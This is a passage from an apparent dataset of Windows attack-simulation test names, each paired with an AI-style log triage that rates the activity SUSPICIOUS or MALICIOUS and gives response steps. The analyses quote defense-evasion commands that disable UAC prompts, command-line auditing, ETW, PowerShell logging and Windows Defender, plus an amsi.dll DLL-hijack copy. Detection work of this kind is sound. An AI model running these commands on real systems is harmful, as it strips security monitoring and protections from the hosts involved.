   - The PowerShell execution with the command-line argument `-nop -Command Write-Host VBScript executed me!; exit` seems unusual. The `-nop` option (no profile) combined with a script-like command suggests potentially obfuscated or controlled execution, which is a known tactic for malicious actors to execute payloads or scripts without raising alarms.
   
2. **MSI Installer Activity**: 
   - The presence of `msiexec.exe` processes and installation activity involving `data.007_VBScript.msi` in a temporary directory is suspicious. This can sometimes indicate the execution of potentially unwanted or harmful software, particularly since it is paired with PowerShell activity.

3. **Time Discrepancy and System Time Events**: 
   - Anomalies in system time adjustments often warrant attention. The discrepancies in timestamps within several logs, especially with security logs showing event ID 4616 detailing time changes using `svchost.exe`, might suggest attempts at manipulating system logs or times, which could be a cover for malicious activities.

4. **Sysmon Events**:
   - The Sysmon logs showcase a series of process executions (e.g., `wevtutil.exe`, `cmd.exe`, `conhost.exe`) around the same time as the PowerShell and MSI installer events, which on their own are normal processes but could be chained for exploitation purposes.

5. **User and Process Integrity**:
   - The activities are executed under a user labeled as `SERVER002\admin_test`, with high integrity levels, implying elevated privileges and potential risk if this account was compromised.

**Assessment**: The combination of PowerShell executions with suspicious command-line parameters, temporary installations via `msiexec.exe`, and system time change activities strongly indicates the possibility of a coordinated malicious action. 

**Resolution**: SUSPICIOUS

**Guidance**: 
- Further investigation is necessary to verify the nature and legitimacy of the `data.007_VBScript.msi` file and its origin.
- Examine user account `admin_test` for unauthorized access or privilege changes.
- Perform a thorough scan of the host system for malware or persistence mechanisms.
- Consider implementing stricter logging and monitoring of PowerShell activities for early detection of anomalous behaviors."
Disable ConsentPromptBehaviorAdmin via registry keys,"Based on the provided log entries, here is a detailed analysis of potentially suspicious or malicious activities:

### Analysis:

1. **Frequent Use of `wevtutil.exe` and `conhost.exe` by `admin_test`:**
   - The logs show multiple executions of `wevtutil.exe` and `conhost.exe` initiated by the user `SERVER002\\admin_test`. 
   - `wevtutil.exe` is typically used for managing Windows event logs, which is not inherently malicious but could be used for log tampering or clearing evidence during an attack. The frequent use of this command without explicit administrator tasks might be suspicious.
   - `conhost.exe` is a legitimate Windows process but is often associated with command execution or being used by malware to interface with command-line or console sessions. The frequent firing of `conhost.exe` partnered with other suspicious applications may suggest unauthorized command-line activities.

2. **Execution of `cmd.exe` with `reg add` Command:**
   - The use of `cmd.exe` with a command-line pattern that modifies registry keys related to user consent (`""HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f""`) is visible in the logs. This alteration changes the User Account Control (UAC) settings, possibly lowering the security controls on the system. This behavior commonly points to privilege escalation or tampering with system security settings and is considered suspicious and potentially malicious.

3. **Elevated Privileges on Logon:**
   - Multiple events (Event ID: 4672) indicate that the user `admin_test` is logging on with elevated privileges. While `admin_test` might be a legitimate admin account, the log shows the exercise of various high privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`), which are often abused in lateral movement and privilege escalation strategies.

4. **Use of `whoami.exe` and `hostname.exe`:**
   - The execution of `whoami.exe` and `hostname.exe` is recorded. These tools can be used for reconnaissance to gather system and user details. 

5. **Time Synchronization and Adjustments:**
   - The logs show time-related changes with svchost.exe leading to Event ID: 4616 in the security log. Although this process is routine in synchronization with time servers, sudden or frequent changes can indicate an attempt to tamper with logs or system time for malicious purposes.

6. **Suspect Network Activity:**
   - Network logon events (4624) indicate access from an external workstation (`DESKTOP-3HL5B2P`) through NTLM, suggesting a potential RDP or network connection, possibly unauthorized, as part of lateral movement.

### Assessment:

The activities observed are suspicious due to:

- Unusual frequency and context of log management utility usage (`wevtutil.exe`).
- Registry modifications potentially indicating privilege/escalation.
- Elevated privileges used regularly, possibly against standard best practices.
- Potentially unauthorized external connections using NTLM.

### Resolution:

**SUSPICIOUS** - The log entries contain activity that suggests potential malicious behavior and need further investigation. There is no definitive indication of compromise without additional context or data, but the observed actions (especially relating to registry changes and elevated privileges) warrant further scrutiny.

### Guidance on How to Proceed:

1. **Conduct User and Access Audit:**
   - Verify the identity and access permissions of the account `admin_test` and ensure it's being used properly according to your organizational policy.

2. **Analyze External Logon Sources:**
   - Investigate the network origins and purpose of connections from `DESKTOP-3HL5B2P` to ensure they are authorized.

3. **Review Recent System Changes:**
   - Check for any recent administrative actions taken by `admin_test`, especially on registry and system configurations.

4. **Network Traffic Monitoring:**
   - Monitor and inspect traffic logs for unusual IP addresses or ports used during NTLM connections.

5. **Heightened Monitoring and Threat Intelligence:**
   - Implement increased scrutiny of events related to the use of privileged accounts, especially those with system-altering capabilities. Consider using threat intelligence feeds to correlate activities with known indicators of compromise (IOCs).

6. **Potential Incident Response:**
   - Depending on findings, prepare to initiate an incident response, including containment, eradication, and recovery measures if malicious activities are confirmed."
Disable Windows Command Line Auditing using reg.exe,"Upon analysis of the provided logs, I have identified several key points and indicators of potentially suspicious activity:

1. **Security Logs**:
   - The security logs are reporting events indicating that the system time was adjusted. The process involved is `svchost.exe`, which is a legitimate Windows process but could also be used maliciously if compromised. Time adjustments could correlate with activities meant to obfuscate and avoid detection.

2. **Sysmon Logs**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` being spawned by the same user `SERVER002\admin_test` are seen. The use of `wevtutil.exe`, a tool for managing Windows Event logs, without clear context could be suspicious if used for malicious intent such as clearing logs.
   - The execution of `cmd.exe` with the command line to modify the registry key related to auditing process command lines (`reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f`) is highly suspicious. This command can disable auditing of command-line arguments which is a technique seen in cyber-attacks to evade security monitoring.
   - The sequence of events shows legitimate tools like `whoami.exe` and `hostname.exe`, which are benign but might also be used during the reconnaissance phase of an attack to gather system information.

3. **Application & System Logs**:
   - The application logs show Microsoft Edge's update processes running, which generally appears benign. However, the presence of multiple processes in a short time span is noteworthy for further audit, particularly given the suspicious registry modification.
   - System logs confirm that the system time was adjusted. It aligns with the events in the security logs, adding to the anomaly around time changes potentially for stealth-based operations.

**Assessment**: The combination of unexpectedly altering the system's auditing capabilities through registry changes and the adjustment of system time without a legitimate reason suggests potential malicious activity, specifically aimed at covering one's tracks. The use of system executables like `wevtutil.exe` might be attempted log clearance or manipulation. The presence of legitimate update processes by `Microsoft Edge` aren't directly concerning, but timing and overlapping with other suspicious activities advocate for a deeper look.

**Resolution**: **SUSPICIOUS**

**Guidance on how to proceed**:
- Investigate the source and intent of command executions, focusing on the origin of the registry modifications.
- Review recent changes and network connections initiated by actions around the logged activities.
- Conduct threat hunting for possible Indicators of Compromise (IOCs) related to the identified suspicious behavior.
- Implement or verify the presence of activity monitoring and logging immediately to capture further evidence.  
- Consider isolating the affected system for a comprehensive forensic investigation to detect any lateral movement or data exfiltration attempts.
- Validate the integrity and security posture of the system user `SERVER002\admin_test` for any illegitimate access or compromised credentials."
Msiexec.exe - Execute Local MSI file with embedded JScript,"### Detailed Analysis:

#### Sysmon Logs:
1. **Process Executions**:
   - **PowerShell Execution**: Detected execution of `powershell.exe` by `SERVER002\admin_test`. PowerShell is often used for administrative tasks but can also be used for malicious purposes. However, without further detail on the specific command executed, this alone is not necessarily indicative of malicious activity.
   - **Conhost.exe**: Multiple instances of `conhost.exe` were executed, always in conjunction with standard system utilities. This is typical behavior as `conhost.exe` is used to host command-line interfaces in Windows.
   - **Wevtutil.exe**: This tool is used for enabling and querying event logs. While not inherently malicious, repeated usage might indicate someone attempting to clear logs or extract them.
   - **MsiExec Usage**: Notably, there was execution of `msiexec.exe` to install an msi package located in a temporary directory with a path: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.007\bin\data.007_JScript.msi`. Installation from the Temp directory may be suspicious, especially if it involves scripts or binaries that are not typical for the environment.
   - **Whoami & Hostname**: Executing `whoami.exe` checks who is logged in, which is often seen when attackers are trying to understand the level of access they've obtained. However, this could also be part of normal administrative scripts.

2. **Temporary Files and Execution**: 
   - Execution of an msi located in a temporary directory is questionable (`data.007_JScript.msi`). This MSI could potentially be malicious if it was delivered through a phishing attempt or drive-by-download attack.

3. **Cmd.exe Execution**:
   - Command issued to execute msiexec from a cmd.exe process. Command lines involving execution of items from the Temp user directories can be indicative of script kiddie activity, potentially deploying payloads or further scripts.

#### Application Logs:
- **MsiInstaller Events (1040, 1042)**: Corresponds to the msiexec activity logged in Sysmon, indicating the installation process of the particular msi file. This could be a software deployment step but is noteworthy due to its atypical directory for source.
- **Windows Defender**: Logs indicate that Windows Defender was running and active, but no explicit logs of malware detection are shown.

#### Assessment:
- **Indicators of Potential Malicious Activity**: The combination of `msiexec` being invoked from a command prompt, installing an msi from a user's temporary directory, and the frequent logging tasks (`wevtutil`) paired with the execution of diagnostic commands (`whoami`) could suggest that an attempt was made to execute or hide malicious activity.
- **Low-level Admin Activity**: Executions are predominantly under the admin_test account with a high integrity level that can be indicative of either legitimate administrative work or initial foothold access gained by an attacker.

### Guidance and Resolution:

- **Analyze the File**: Immediate analysis of the msi file (`data.007_JScript.msi`) should be conducted. Perform sandbox analysis to verify its behavior.
- **Confirm Legitimate Activities**: Engage the administrative team or the user associated with `admin_test` to verify if these actions were part of legitimate tasks or software installations.
- **Monitor and Alert Configuration**: Employ monitoring for similar command-line activities, especially invoking msiexec from untypical directories or use of PowerShell without accompanying logged legitimate administrative processes.
- **Check for Corresponding Security Alerts**: Review antivirus and endpoint detection logs for any correlated alerts around the found Sysmon activities, especially any corresponding alerts related to the time and processes.

### Final Resolution:
- **SUSPICIOUS**: The activity in the logs is deemed suspicious. It does not conclusively portray outright malicious intent without additional information (such as inspection results of the MSI file or corroborative events from other logs), but it certainly warrants further investigation."
Phantom Dll Hijacking - WinAppXRT.dll,"In reviewing the provided Windows event logs, several entries stand out that require careful examination.

1. **Sysmon Log Events:**
   - There are multiple references to `MicrosoftEdgeUpdate.exe`, which appear to be carrying out updates as part of its legitimate function. This includes launching processes under `NT AUTHORITY\SYSTEM`.
   - However, a specific command line execution caught attention:
     ```
     ""cmd.exe"" /c copy %%windir%%\System32\amsi.dll %%APPDATA%%\amsi.dll &amp; ren %%APPDATA%%\amsi.dll WinAppXRT.dll &amp; copy %%APPDATA%%\WinAppXRT.dll %%windir%%\System32\WinAppXRT.dll &amp; reg add ""HKEY_CURRENT_USER\\Environment"" /v APPX_PROCESS /t REG_EXPAND_SZ /d ""1"" /f
     ```
     This operation appears to manipulate system-critical files like `amsi.dll`, which is the Anti-Malware Scan Interface commonly targeted by attackers to bypass security mechanisms. The operation involves copying, renaming, and replacing DLL files in the System32 directory. This kind of behavior is typically indicative of a potential compromise.

2. **Process Execution:**
   - Another notable execution is the `reg.exe` command:
     ```
     reg  add ""HKEY_CURRENT_USER\\Environment"" /v APPX_PROCESS /t REG_EXPAND_SZ /d ""1"" /f
     ```
     This command modifies the registry in a potentially suspicious manner, likely linked to persistence mechanisms through environment variable manipulation.

3. **User Context and Integrity Level:**
   - These suspicious activities occurred under `SERVER002\admin_test`, with a high integrity level, suggesting the use of administrative privileges to carry out these tasks.

4. **Additional Observations:**
   - Usage of `whoami.exe` and `hostname.exe` could be benign on their own but when viewed in conjunction with other actions, might signify system reconnaissance steps.

5. **Other Log Reviews:**
   - The Application logs and System logs associated with routine processes and lack corresponding suspicious activity do not provide additional insights into suspicious actions.

**Assessment:**
- **Indicators of Compromise (IoC):** The use of `cmd.exe` to manipulate critical DLLs and registry entries is a definitive indicator of potentially malicious activity, especially given its method of bypassing defense.

**Resolution:** MALICIOUS

**Recommendations:**
1. **Immediate Action:**
   - Isolate the system from the network to prevent spread or further unauthorized actions.
   - Conduct a forensic analysis to investigate further occurrences and secure any volatile evidence.

2. **Follow Up:**
   - Review system health and reinstall or repair the compromised `amsi.dll` and related system components.
   - Implement additional monitoring using endpoint detection and response solutions to watch for similar activity patterns.
   - Consider a company-wide review of user permissions to ensure the principle of least privilege.
  
3. **Long Term:**
   - Implement enhanced security measures such as application whitelisting, behavior analysis, and continuous threat intelligence to preempt similar attacks.

Given the methods observed, the activity appears to be decisively malicious and demands immediate attention to protect organizational assets."
Disable .NET Event Tracing for Windows Via Registry (cmd),"Based on the provided Sysmon and Application logs from the Windows machine (Server002), I conducted an analysis to identify any indicators of malicious activity. Here's a detailed breakdown of the analysis:

1. **Sysmon Logs:**
   - The logs predominantly feature the execution of various Windows system utilities and Microsoft Edge Update processes. Key activities include:
     - Frequent invocation of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test`.
     - Execution of `HOSTNAME.EXE` and `whoami.exe` which can be indicative of a user gathering general system information. These appear benign given the context and lack of suspicious arguments or unusual parent processes.
     - A critical observation is the presence of `cmd.exe` executing a registry modification command: `REG ADD HKLM\Software\Microsoft\.NETFramework /v ETWEnabled /t REG_DWORD /d 0`. This command disables Event Tracing for Windows (ETW), which could be an indication of an attempt to obfuscate further activities by reducing logging.
     - The registry edit activity is concerning and typically associated with actions taken to evade detection or logging.
   
2. **Edge Update Activity:**
   - There are numerous logs indicating the execution of Microsoft Edge update-related processes under `NT AUTHORITY\SYSTEM`, which is a legitimate system account context.
   - These include commands with arguments that suggest typical update operations, such as `/update`, `/svc`, and `/regsvc`. However, such executions must be reviewed to ensure they align with typical patch schedules or update frequency for the system, especially if they seem repetitive in a very short time span.

3. **Application Logs:**
   - There are two logged events from `edgeupdate` indicating that a service had stopped. These could just be part of the natural lifecycle of update processes terminating after completion.

4. **Potential Issues & Risks:**
   - The most glaring area of concern is the registry modification (disable ETW), which is often used by adversaries to avoid generating event logs, a common evasion tactic.
   - The repeated invocation of system utilities like `wevtutil.exe` could suggest log-clearing intentions, though not definitively malicious in isolation.

**Conclusion:**
- The presence of process executions tied to disabling ETW and frequent wevtutil executions suggests potential malicious activity aimed at obscuring or reducing the audit trail on the system. Given these indicators, I recommend labeling the activity as **SUSPICIOUS**.

**Guidance:**
- Conduct further investigation to verify the legitimacy of the ETW setting change. This includes reviewing user behavior, corroborating with patch schedules, and checking for alignment with authorized changes.
- Increase monitoring and logging of suspect activities on `Server002`.
- Consider segmenting affected systems from the network to prevent potential lateral movement until a thorough investigation concludes.
- Engage in digital forensics to identify any additional traces of compromise."
Windows HideSCAHealth Group Policy Feature,"### Analysis

1. **Application Logs Analysis**
   - The Application Log shows events related to the Software Protection Platform and edgeupdate service stopping:
     - These records don't indicate any unusual or unexpected behavior typically associated with malware or other security incidents.

2. **Sysmon Logs Analysis**
   - Several Sysmon Event IDs ""1"" and ""5"" were recorded which indicate process creation and file creation time. 
   - Observed benign processes:
     - Regular system processes such as `whoami.exe`, `conhost.exe`, `hostname.exe`, and legitimate `Microsoft Edge Update` processes (`MicrosoftEdgeUpdate.exe`) were recorded.
     - These services often run under `NT AUTHORITY\SYSTEM`, indicating system-level processes related to Windows Updates or service management.
   - Suspicious Command Lines:
     - The execution of `cmd.exe` with the command `reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCAHealth /t REG_DWORD /d 1 /f` is suspicious. This registry change hides the Security and Compliance App's health status, which could indicate an attempt to obfuscate the device's security status.
     - This command execution is an indicator of potential unauthorized system changes and should be investigated further.

3. **Event Context and Assessment**
   - Most of the observed events in the Sysmon logs that relate to system processes and Microsoft Edge Updates are expected behaviors on a Windows system.
   - The suspicious registry modification, however, suggests a potential security risk since it is uncommon for standard operations or applications to make such changes to registry keys related to user interface and security without user consent or known administrator actions.

### Summary
- **Suspicious Behavior:** 
  - Unauthorized registry modification by cmd.exe is a potential security risk. This action can be a part of a larger attempt to alter system behavior or hide malicious activity.
- **Anomalous Activities:**
  - Frequent creation of child processes like conhost.exe following standard processes could be benign in nature but warrants attention only if observed under unusual circumstances repeatedly with other indicators.
  
### Resolution: SUSPICIOUS
The logs contain suspicious registry modifications that are not typical of normal user behavior. Further investigation should be done to ascertain whether this change was part of an authorized security policy deployment, a legitimate application, or indicative of a malicious actor modifying system configurations.

### Guidance on How to Proceed:
1. **Immediate Actions:**
   - Conduct a full AV scan focusing on recent changes to the registry and system files.
   - Investigate user accounts and privileges on the system `Server002` to determine if unauthorized accesses occurred.
2. **Further Investigation:**
   - Check for potential recent installations that may have triggered this registry change.
   - User activity logs and history could provide context, especially if there are other unlogged command executions or failures.
3. **Mitigation and Controls:**
   - Monitor registry changes and process creation using Sysmon or similar telemetry tools for patterns and potential anomalies.
   - Employ security controls such as AppLocker, monitoring unauthorized execution of potentially unwanted applications.
"
InstallHelper method call,"Upon analyzing the provided event logs, the following observations were made:

1. **PowerShell Activity**:
   - The logs indicate the execution of a PowerShell script located at `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\src\InstallUtilTestHarness.ps1`. This script is executed via PowerShell and involves creating or modifying assemblies through the `Add-Type` cmdlet which compiles C# code inline.
   - The script seems to be related to testing with the presence of methods like `InstallHelper`, and DLL manipulation using a `.dll` file (`data.004.dll`) which are typical in scenarios involving manipulation of .NET components.

2. **Sysmon and Application Logs**:
   - Multiple instances of PowerShell execution are noted, which are generally not unusual by themselves but can be sensitive based on the context. Here, the activity seems focused on invoking a build and install utility assembly.
   - Microsoft Edge Update is running multiple times. While updates are generally benign, repetitive and patterned executions can sometimes be leveraged for persistence mechanisms in adversarial scenarios.
   - There are several instances of processes like `wevtutil.exe` and `conhost.exe`, but no immediate malicious patterns are observed. These processes often relate to command-line interfaces and event log management respectively.

3. **Indicators of Threats**:
   - The use of temporary paths for script execution and the detailed PowerShell command lines indicate the potential for testing or scripting that manipulates system configurations through .NET assemblies.
   - While it is possible to use these techniques maliciously, such as for persistence, backdooring, or evasion, the context provided appears to show execution in a testing manner rather than unaccounted systemic compromise.

4. **Overall Assessment and Resolution**:
   - **SUSPICIOUS** - The observed activities warrant further investigation. The PowerShell activities and interaction with .NET assemblies suggest test scenarios or setup activities that are not outright malicious but are not standard for typical end-user behaviors. It would be prudent to confirm the legitimacy of the activities, verify with the involved personnel if these actions were intentional, and ensure there are no unknown actors involved.

**Guidance**:
- Verify with the IT or Development department if these activities align with any scheduled testing or deployment tasks.
- Check for any security policies regarding the use of PowerShell and compiling .NET assemblies to ensure compliance.
- If not already in place, enhance logging and monitoring of PowerShell activities and .NET assembly manipulations for improved security posture.
- Consider conducting a security audit to confirm if there are any related modifications to the system's state or configurations that might indicate malicious intent."
BlackByte Ransomware Registry Changes - Powershell,"After a thorough analysis of the provided logs, the following observations can be made:

### Anomalies and Suspicious Activities:
1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - There are multiple events showing the execution of `wevtutil.exe` and `conhost.exe`. These utilities are legitimate Windows processes used for managing event logs and console host processes, respectively, but frequent and rapid successive instances can be suspicious and potentially indicative of log manipulation or session hijacking.
   - **Analysis:** The processes were executed under the user `SERVER002\admin_test`. While this account might have privileges to run these utilities, the successive execution at incredibly short intervals is unusual.

2. **PowerShell Execution:**
   - The `powershell.exe` process was used to modify registry settings. The command involves setting registry keys for `LocalAccountTokenFilterPolicy`, `EnableLinkedConnections`, and `LongPathsEnabled`.
   - **Analysis:** These modifications could be trying to alter system behavior or compatibility settings. Specifically, `LocalAccountTokenFilterPolicy` modification is often seen in scenarios to bypass UAC restrictions remotely, which can pose a security risk.

3. **Execution of common Windows utilities (`hostname.exe`, `whoami.exe`):**
   - These utilities were executed, which typically aren't flagged as suspicious. However, given the context with other behaviors, they may be part of a script or malicious activity to gather system information or verify user contexts.
  
4. **Registry Modifications via PowerShell:**
   - Multiple registry settings changes were attempted via PowerShell scripts. Such behavior is typical of administrative scripts or potential malware attempting to establish persistence or enable malicious operations.

### Indications of Compromise:
- The PowerShell script's actions and rapid execution of certain Windows utilities suggest at least suspicious behavior possibly indicating malicious intents such as configuration changes for potential unauthorized remote access.
- The modifications to system settings could be related to enabling or disabling certain privileges that could be useful to an attacker.

### Assessment:
Based on the above observations:
- The behavior of rapid successive execution with system and administrative-level changes being attempted indicates a potential attempt at privilege escalation or remote access facilitation.
- The logs show activity that might be considered as part of normal administrative tasks, but the context and pattern of behavior align more closely with suspicious activity.

### Resolution:
**SUSPICIOUS**

### Recommended Actions:
- **Further Investigation:**
  - Inspect the user account `SERVER002\admin_test` activity to determine if actions performed were authorized or expected.
  - Check if similar processes or patterns have appeared on other systems within the network, indicating a wider campaign.
  - Review the source and creation methods of the scripts used, and look for any unauthorized changes or additions to scripts or policies.
  
- **Immediate Containment:**
  - Consider isolating the machine from the network until further investigation can confirm benign or malicious intent.
  - Ensure the security settings, such as User Account Control (UAC) and firewall settings, are appropriately configured and active.
  
- **Review of Registry Changes:**
  - Manually verify changes made to the registry keys and assess if these settings align with organizational policy or requirements.

### Summary:
The logs expose several suspicious activities that need further investigation to confirm if these actions are malicious. The behavior, particularly through PowerShell, suggests a possible compromise attempt to alter key Windows settings that could facilitate unauthorized actions."
Disable Windows Defender with DISM,"Based on the analysis of the provided Windows event logs, here are the key observations and findings:

### Suspicious Activities:
1. **Use of Command Line to Disarm Windows Defender:**
   - `cmd.exe` was executed with the command line argument: `""cmd.exe"" /c Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet`.
   - This command disables Windows Defender, which is a notable action that could indicate an attempt to weaken the host's security defenses. This action was performed under a high integrity level, indicating elevated privileges were used.

2. **Sequential Execution of Utility Tools:**
   - The utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` being executed in rapid succession is somewhat unusual, especially under the same user context (SERVER002\\admin_test). While these may be legitimate admin operations, frequent invocation without a clear administrative context or supporting logs indicating maintenance tasks can be suspicious.

### Analysis of Other Logs:
- **Sysmon Logs:** Record standard utility executions without unusual command line arguments except for the case of disabling Windows Defender.
- **System and Security Logs:** Include typical time change notifications but do not highlight explicit unauthorized access or privilege escalation apart from the aforementioned privileges.
- **Security Log Event 4672:** indicates privileged access by `admin_test` with various high privileges including SeDebugPrivilege, which could be used to manipulate system operations or bypass security controls.

### Other Observations:
- **Edge Update:** There are entries concerning Microsoft Edge Update activities. Such activities seem routine and tied to legitimate software update processes; no indications are perceptible showing tampered or fraudulent action within these updates.
- **Time Synchronization:** The system logs report time synchronization and adjustments which might be typical housekeeping for time servers or system drift corrections.

### Assessment:
The disabling of Windows Defender via command line by the `admin_test` account, without immediate supporting logs to indicate a legitimate reason, is a strong indicator of potentially malicious activity. This aligns with tactics typically employed by attackers to disable security features before launching further attacks. Although other log entries may have routine explanations, the defender-disablement warrants further scrutiny into the source and motivation of this action, along with verifying whether there are any associated unauthorized access attempts or other system modifications.

### Resolution:
**MALICIOUS**

### Guidance on Proceeding:
- **Immediate Action:**
  - Verify and reconcile the task with the responsible administrative user to establish if it was intentional and duly authorized.
  - Implement monitoring to detect any additional usage of such disabling commands and validate the integrity of other security software.

- **Further Investigation:**
  - Conduct a comprehensive review of user activity related to `admin_test` account during this period to identify other unusual patterns or access.
  - Investigate network logs for anomalies around the timestamp of disabling Windows Defender to reveal potential lateral movement or winlogon session tampering.
  
- **Mitigative Actions:**
  - Reinstate Windows Defender protection, and review group policies for unauthorized changes.
  - Consider isolating the system if necessary while further analysis is conducted to ensure the environment's security posture.

By addressing the scenario proactively, it could be determined whether this action stems from a benign maintenance oversight or a potential breach attempting to facilitate further malicious acts."
Dynamic C# Compile,"Based on the provided Windows event logs, here is a detailed analysis of the events:

### Analysis:

1. **PowerShell Activity**:
   - There are multiple instances of PowerShell execution with a command-line argument pointing to a suspicious path: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\` and executing a file `data.004_DynamicCompile.exe`.
   - Example of suspicious PowerShell command: `""powershell.exe"" & {Invoke-Expression ""\""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\bin\data.004_DynamicCompile.exe\""""}`.
   - PowerShell is often used legitimately, but its capabilities can also be exploited for malicious purposes, especially if it is executing code from temporary directories with potential obfuscation or dynamic compilation.

2. **Wevtutil.exe and Conhost.exe Activity**:
   - Frequent execution of `wevtutil.exe` alongside `conhost.exe` by `admin_test` user is unusual. `wevtutil.exe` is used to manage event logs, which could indicate log tampering or clearing activities.
   - Such patterns, especially if not part of routine maintenance or administrative tasks, can be indicative of an attacker trying to cover tracks.

3. **Indicator of Privilege Usage**:
   - Most processes are executed with high integrity levels, suggesting administrative privileges usage. Legitimate admin actions might be fine, but if unauthorized, it suggests privilege escalation or misuse.

4. **Scheduled and Common System Processes**:
   - Execution logs for system processes like `svchost.exe`, `wuauclt.exe`, and updates related to Microsoft Edge, Windows Defender, etc., seem to be part of normal patching and updates.
   - However, their inclusion should be further scrutinized for unauthorized or hidden malicious payload if other indicators line up with known attacker behaviors or tactics.

### Conclusions:

**SUSPICIOUS**: 
- The logs exhibit suspicious behavior due to the frequent and potentially out-of-context use of PowerShell with paths involving temporary directories, possible dynamic execution, and various system utilities by a user account (admin_test) without clear justification in the logs. The activities suggest potential PowerShell misuse and event log management tools usage, possibly reflecting actions indicative of an attempted or successful compromise. However, without detecting a payload or known malicious indicator conclusively identified, further investigation is required to rule out administrative tasks or false positives.

### Guidance on How to Proceed:

1. **Immediate Action**: 
   - Investigate the PowerShell execution for potential script contents and context. Check if `data.004_DynamicCompile.exe` is expected or authorized.
   - Validate whether the `admin_test` account activity aligns with standard operation procedures and if the account had authorized access during these events.
   
2. **Broader Investigation**:
   - Conduct a thorough scan for malware or unwanted software, especially focusing on files in temporary directories used in PowerShell commands.
   - Evaluate recent changes or installations on the machine for inconsistencies or unexpected modifications.
   - Review access logs, particularly focusing on remote and administrative access during the timeframe of these logs.
   
3. **Enhance Monitoring**:
   - Deploy enhanced logging and monitoring on PowerShell usage and administrative-level operations moving forward to capture additional context and prevent potential incidents. Implement Just Enough Administration (JEA) and Just-In-Time (JIT) access controls if not already in place.

4. **User Awareness**:
   - Ensure all users, especially those with admin credentials, are educated about potential threats related to PowerShell and tool misuse."
Certutil Rename and Decode,"Based on the provided Windows event logs, here is the detailed analysis:

### Application Log:
- **Windows Defender Events**: The logs confirm that Windows Defender is in ""SECURITY_PRODUCT_STATE_ON"", indicating it is active and should be providing protection.

### Security Log:
- **Event 4624**: This is a successful logon event. The logon type is 5, which is a service logon indicating a service was started, which is typical and expected behavior for system processes.
- **Event 4672**: Special privileges were assigned. The privileges listed (including SeDebugPrivilege) are typical of the SYSTEM account and aren't inherently suspicious unless seen under unexpected context.
- **Event 4616**: This indicates a change in system time, which can sometimes be a red flag if not accounted for, but in isolation does not indicate malicious activity.

### Sysmon Log:
- **Multiple Executions of wevtutil.exe and conhost.exe by admin_test**: There are multiple executions of `wevtutil.exe` and `conhost.exe` by the `admin_test` user. `wevtutil.exe` is a legitimate tool for managing Windows Event Logs, often used by administrators or scripts to query logs.
  
- **Execution of CertUtil.exe with Encoding/Decoding**: The execution of `cmd.exe` to copy `certutil.exe` and use it for encoding a `.exe` file and then decoding it back is highly suspicious. This is a known technique for file obfuscation used by attackers to bypass detection mechanisms by encoding malicious payloads. The encoding and decoding processes using `certutil` and placing the temporary files in a high-integrity session under `admin_test` are strong indicators of malicious behavior.

### Guidance and Conclusion:
- **Suspicious Indicator**: The activity surrounding the use of `certutil.exe` to encode and decode an executable file on the system stands out as a potential indicator of compromise, employing techniques commonly used in obfuscation and APT-grade attacks.
- **Resolution**: Given the suspicious usage of `certutil.exe` and the context of its use, I would classify this activity as **MALICIOUS**.

### Recommendations:
1. **Immediate Isolation**: Isolate the affected host from the network to prevent any potential spread of malicious activity.
2. **In-Depth Forensic Analysis**: Conduct a thorough investigation of the system file integrity, network activity, and additional log files to trace the origin and method of compromise.
3. **Credential Audit**: Ensure credentials used by `admin_test` and other critical accounts are secure and assess any anomalies in recent administrative activities.
4. **Review and Audit the Use of System Tools**: Ensure that legitimate admin tools like `certutil` and `wevtutil` are not used inappropriately or without due monitoring.
5. **Enhanced Monitoring**: Implement stricter monitoring rules around tools like `certutil.exe`, particularly focusing on command-line arguments and process ancestry to detect similar activities in the future.
6. **Security Training and Policy**: Increase awareness and train staff on identifying such suspicious activities and refine security policies to mitigate misuse of administrative tools.

This analysis suggests potentially malicious activity that needs prompt attention and an immediate response."
Windows Powershell Logging Disabled,"Upon reviewing the provided Windows event logs, here's a detailed analysis focusing on any suspicious or anomalous behavior:

### Suspicious or Anomalous Behavior:
1. **Unexpected Registry Modifications:**
   - There are multiple `reg.exe` executions modifying registry settings related to PowerShell logging: 
     - Disabling `EnableModuleLogging`, `EnableScriptBlockLogging`, `EnableTranscripting`, and `EnableScripts` in the registry paths under PowerShell policies.
   - This is highly suspicious as these changes can prevent logging of PowerShell activities, which is often a tactic used by attackers to cover their tracks after executing malicious scripts.

2. **Frequent Use of `wevtutil.exe`:**
   - `wevtutil.exe` is repeatedly used, potentially to export event logs (`epl`) to a temporary file. This could be part of an attacker's strategy to access or manipulate logs for stealth operations or data exfiltration.

3. **Time Manipulation:**
   - System time changes (`EventID 4616` from the Security log) indicate that the system clock was altered. Time manipulation can be used to confuse log timestamps and hinder forensic analysis.

4. **Console Usage by Administrator:**
   - Processes such as `cmd.exe`, `wevtutil.exe`, and others, are seen being executed by a user identified as `SERVER002\\admin_test`, suggesting unusual command-line activity under administrative privileges.

### Potential Legitimate Behavior:
- **Microsoft Edge Update Processes:**
  - Multiple instances of Microsoft Edge processes (like `MicrosoftEdgeUpdate.exe`) are observed, likely related to legitimate Edge update activities as evidenced by Microsoft-verified hashes and typical command-line parameters.

### Recommendation:
Considering the actions performed, especially the disabling of PowerShell logging, frequent log exports, and system time manipulation, there are strong indicators of potentially malicious activity occurring on this host.

### Resolution:
**MALICIOUS** - The registry changes to disable PowerShell logging, combined with other anomalous activities, indicate a compromise aimed at obfuscating malicious activity. Immediate action is required to prevent further damage and to investigate the extent of the breach.

### Guidance on How to Proceed:
1. **Containment:**
   - Isolate the affected host (Server002) from the network to prevent further spread or data exfiltration.

2. **Investigation:**
